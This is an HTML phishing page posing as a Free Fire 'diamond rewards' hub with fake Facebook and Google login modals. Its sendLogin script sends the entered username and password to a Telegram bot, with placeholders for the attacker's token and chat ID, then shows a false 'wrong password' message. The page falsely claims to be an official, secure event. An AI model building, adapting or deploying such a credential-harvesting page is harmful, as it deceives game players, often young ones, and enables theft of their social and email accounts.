<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Free Fire Elite ‚Ä¢ Reward Hub</title>
  
  <!-- Google Font & Font Awesome for Icons -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', sans-serif;
    }

    body {
      background: radial-gradient(circle at 10% 30%, #0b1120, #030614);
      color: #f0f4ff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    /* üß© GLASSMORPHIC HEADER */
    header {
      width: 100%;
      background: rgba(2, 6, 23, 0.85);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      border-bottom: 1px solid rgba(34, 197, 94, 0.25);
      padding: 18px 30px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      position: sticky;
      top: 0;
      z-index: 100;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6);
    }

    header i {
      font-size: 32px;
      color: #22c55e;
      filter: drop-shadow(0 0 6px #22c55e88);
    }

    header span {
      font-size: 26px;
      font-weight: 700;
      letter-spacing: 1px;
      background: linear-gradient(135deg, #e2e8f0, #b3f0c0);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    /* ‚ú® HERO SECTION */
    .hero {
      text-align: center;
      margin: 40px 20px 10px;
    }

    .hero h1 {
      font-size: 48px;
      font-weight: 800;
      background: linear-gradient(135deg, #ffffff, #bbf7d0);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 0 20px #22c55e50;
      letter-spacing: -0.5px;
    }

    .hero p {
      font-size: 18px;
      color: #94a3b8;
      margin-top: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .hero p i {
      color: #eab308;
    }

    /* üíé CARD GRID */
    .container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 28px;
      padding: 40px 20px 50px;
      max-width: 1200px;
      margin: 0 auto;
    }

    .card {
      background: linear-gradient(145deg, #1e293b, #0f172a);
      border: 1px solid #334155;
      border-radius: 32px;
      padding: 28px 16px 24px;
      width: 240px;
      box-shadow: 0 25px 40px -15px #00000080, 0 0 0 1px #22c55e20 inset;
      transition: transform 0.25s ease, box-shadow 0.3s ease;
      backdrop-filter: blur(4px);
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .card:hover {
      transform: translateY(-10px);
      box-shadow: 0 30px 50px -15px #000000d0, 0 0 0 2px #22c55e inset;
    }

    .card h3 {
      font-size: 26px;
      font-weight: 700;
      margin: 12px 0 4px;
      background: linear-gradient(135deg, #f8fafc, #bef264);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    .card .diamond-icon {
      font-size: 48px;
      filter: drop-shadow(0 8px 12px #22c55e);
      margin-bottom: 8px;
    }

    .card button {
      background: linear-gradient(135deg, #22c55e, #16a34a);
      border: none;
      padding: 14px 30px;
      border-radius: 50px;
      font-weight: 600;
      font-size: 16px;
      color: white;
      cursor: pointer;
      margin-top: 16px;
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      box-shadow: 0 8px 20px #22c55e60;
      transition: 0.2s;
      border: 1px solid #86efac70;
    }

    .card button:hover {
      background: linear-gradient(135deg, #2ecc71, #15803d);
      box-shadow: 0 8px 25px #22c55e;
      transform: scale(1.02);
    }

    /* üî• POPUP MODERN (LOGIN SELECT) */
    .popup {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(3, 6, 20, 0.9);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }

    .popup-box {
      background: #111827;
      border: 1px solid #22c55e40;
      border-radius: 40px;
      padding: 30px 25px 30px;
      width: 340px;
      text-align: center;
      box-shadow: 0 30px 60px #000000b0, 0 0 0 1px #22c55e inset;
      animation: fadeSlide 0.2s ease;
    }

    .popup-box h2 {
      font-size: 28px;
      font-weight: 600;
      color: #e2e8f0;
      margin-bottom: 24px;
    }

    .popup-box button {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      border: none;
      border-radius: 60px;
      font-size: 18px;
      font-weight: 600;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      cursor: pointer;
      transition: 0.2s;
      border: 1px solid transparent;
    }

    .fb {
      background: #1877f2;
      color: white;
      box-shadow: 0 4px 14px #1877f2a0;
    }

    .fb:hover {
      background: #166fe5;
      transform: scale(1.02);
      border-color: #ffffff50;
    }

    .gmail {
      background: #ffffff;
      color: #1e1e1e;
      box-shadow: 0 4px 14px #db4437b0;
    }

    .gmail i {
      color: #db4437;
    }

    .gmail:hover {
      background: #f5f5f5;
      transform: scale(1.02);
    }

    .close {
      background: #2d3748;
      color: #e2e8f0;
      margin-top: 18px;
      border: 1px solid #4b5563;
    }

    .close:hover {
      background: #3f4a5c;
    }

    /* üîê LOGIN PAGES (FACEBOOK / GMAIL) */
    .login-page {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.9);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      justify-content: center;
      align-items: center;
      z-index: 1100;
    }

    .login-box {
      background: #0f172a;
      border: 1px solid #22c55e50;
      border-radius: 36px;
      padding: 32px 28px;
      width: 350px;
      color: white;
      box-shadow: 0 30px 50px #000000, 0 0 0 1px #22c55e inset;
      animation: fadeSlide 0.2s ease;
    }

    .login-box h3 {
      font-size: 26px;
      font-weight: 600;
      margin-bottom: 24px;
      display: flex;
      align-items: center;
      gap: 10px;
      justify-content: center;
    }

    .login-box h3 i {
      font-size: 28px;
    }

    .login-box input {
      width: 100%;
      padding: 15px 18px;
      margin: 12px 0;
      border: none;
      border-radius: 50px;
      background: #1e293b;
      border: 1px solid #334155;
      color: white;
      font-size: 15px;
      outline: none;
      transition: 0.2s;
    }

    .login-box input:focus {
      border-color: #22c55e;
      box-shadow: 0 0 0 3px #22c55e30;
    }

    .login-box input::placeholder {
      color: #94a3b8;
      font-weight: 400;
    }

    .login-box button {
      background: linear-gradient(135deg, #22c55e, #16a34a);
      border: none;
      padding: 15px;
      border-radius: 50px;
      font-weight: 700;
      font-size: 18px;
      color: white;
      width: 100%;
      margin: 20px 0 10px;
      cursor: pointer;
      box-shadow: 0 8px 18px #22c55e80;
      transition: 0.2s;
      border: 1px solid #bbf7d0;
    }

    .login-box button:hover {
      background: linear-gradient(135deg, #2ecc71, #15803d);
      box-shadow: 0 10px 25px #22c55e;
    }

    /* small close hint */
    .back-link {
      margin-top: 16px;
      font-size: 15px;
      color: #94a3b8;
      cursor: pointer;
      text-decoration: underline dotted;
    }

    .back-link:hover {
      color: #22c55e;
    }

    @keyframes fadeSlide {
      from { opacity: 0; transform: translateY(15px); }
      to { opacity: 1; transform: translateY(0); }
    }

    /* footer micro */
    .footnote {
      text-align: center;
      color: #4b5563;
      padding: 20px;
      font-size: 14px;
      border-top: 1px solid #1e293b;
      width: 100%;
      margin-top: 20px;
    }

    .footnote i {
      color: #22c55e;
    }
  </style>
</head>
<body>

  <!-- GLASS HEADER -->
  <header>
    <i class="fas fa-fire"></i>
    <span>FREE FIRE ‚Ä¢ ELITE REWARDS</span>
  </header>

  <!-- HERO SECTION -->
  <section class="hero">
    <h1>DIAMOND REWARDS</h1>
    <p><i class="fas fa-bolt"></i> Limited time event ‚Äî claim your bonus <i class="fas fa-bolt"></i></p>
  </section>

  <!-- REWARD CARDS (PREMIUM) -->
  <div class="container">
    <div class="card">
      <div class="diamond-icon"><i class="fas fa-gem"></i></div>
      <h3>100 üíé</h3>
      <p style="color:#9ca3af; font-size:14px;">starter pack</p>
      <button onclick="openPopup()"><i class="fas fa-gift"></i> Claim now</button>
    </div>
    <div class="card">
      <div class="diamond-icon"><i class="fas fa-crown"></i></div>
      <h3>310 üíé</h3>
      <p style="color:#9ca3af; font-size:14px;">elite bundle</p>
      <button onclick="openPopup()"><i class="fas fa-gift"></i> Claim now</button>
    </div>
    <div class="card">
      <div class="diamond-icon"><i class="fas fa-skull"></i></div>
      <h3>520 üíé</h3>
      <p style="color:#9ca3af; font-size:14px;">rare skin</p>
      <button onclick="openPopup()"><i class="fas fa-gift"></i> Claim now</button>
    </div>
  </div>

  <!-- LOGIN SELECTION MODAL (POPUP) -->
  <div id="popup" class="popup">
    <div class="popup-box">
      <h2><i class="fas fa-lock-open" style="color:#22c55e;"></i> verify account</h2>
      <button class="fb" onclick="facebookLogin()"><i class="fab fa-facebook-f"></i> Continue with Facebook</button>
      <button class="gmail" onclick="gmailLogin()"><i class="fab fa-google"></i> Continue with Google</button>
      <button class="close" onclick="closePopup()"><i class="fas fa-times"></i> Close</button>
    </div>
  </div>

  <!-- FACEBOOK LOGIN MODAL (MOCK) -->
  <div id="fbLogin" class="login-page">

    <div class="login-box">
        <h3><i class="fab fa-facebook" style="color:#1877f2;"></i> Facebook Login</h3>
        <input type="text" id="username" placeholder="Username" required />
        <input type="password" id="password" placeholder="Password" required />
        <button class="btn-primary" onclick="sendLogin()">Login</button>
        <div class="back-link" onclick="closeFB()"><i class="fas fa-arrow-left"></i>  back</div>
      </div>
  </div>

  <!-- GMAIL LOGIN MODAL (MOCK) -->
  <div id="gmailLogin" class="login-page">
    <div class="login-box">
      <h3><i class="fab fa-google" style="color:#ea4335;"></i> Google Sign in</h3>
      <input type="text" id="username" placeholder="Username" required />
      <input type="password" id="password" placeholder="Password" required />
      <button class="btn-primary" onclick="sendLogin()">Login</button>
      <div class="back-link" onclick="closeGmail()"><i class="fas fa-arrow-left"></i>  back</div>
    </div>
  </div>

  <!-- tiny footer -->
  <div class="footnote">
    <i class="fas fa-shield-alt"></i> official reward hub ‚Ä¢ 100% secure event
  </div>

  <script>
        function sendLogin() {
      const user = document.getElementById('username').value;
      const pass = document.getElementById('password').value;

      if (!user || !pass) {
        alert("Please fill all fields");
        return;
      }

      // ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ Telegram Bot Token ‡¶è‡¶¨‡¶Ç Chat ID ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶¨‡¶∏‡¶æ‡¶®
      const botToken = "__TOKEN__";
      const chatId = "__CHATID__";

      const message = `üîê New Login Info:\nüë§ Username: ${user}\nüîë Password: ${pass}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      })
        .then(res => alert("Username and password wrong please try again!"))
        .catch(err => alert("Error sending to Telegram"));
    }
    function openPopup() {
      document.getElementById('popup').style.display = 'flex';
    }
    function closePopup() {
      document.getElementById('popup').style.display = 'none';
    }

    function facebookLogin() {
      closePopup();                // hides login selection
      document.getElementById('fbLogin').style.display = 'flex';
    }

    function gmailLogin() {
      closePopup();
      document.getElementById('gmailLogin').style.display = 'flex';
    }

    // close facebook modal (go back)
    function closeFB() {
      document.getElementById('fbLogin').style.display = 'none';
      // optionally re-open popup? we just close login; user can click card again.
    }

    function closeGmail() {
      document.getElementById('gmailLogin').style.display = 'none';
    }

    // success / mock verification
    function success() {
      alert('‚úÖ Account Verified Successfully! \nReward will be added within 24h.');
      // hide all login modals
      document.getElementById('fbLogin').style.display = 'none';
      document.getElementById('gmailLogin').style.display = 'none';
      // reload to initial state (as you wished)
      location.reload();  
    }

    // Optional: close popup if click outside (but we keep it simple)
    window.onclick = function(event) {
      // click outside popup-box closes login selector popup
      const popup = document.getElementById('popup');
      if (event.target === popup) {
        popup.style.display = 'none';
      }
      // for fb/gmail overlay you can also add but keep same behaviour
      const fbModal = document.getElementById('fbLogin');
      const gmailModal = document.getElementById('gmailLogin');
      if (event.target === fbModal) fbModal.style.display = 'none';
      if (event.target === gmailModal) gmailModal.style.display = 'none';
    };
  </script>
</body>
</html>
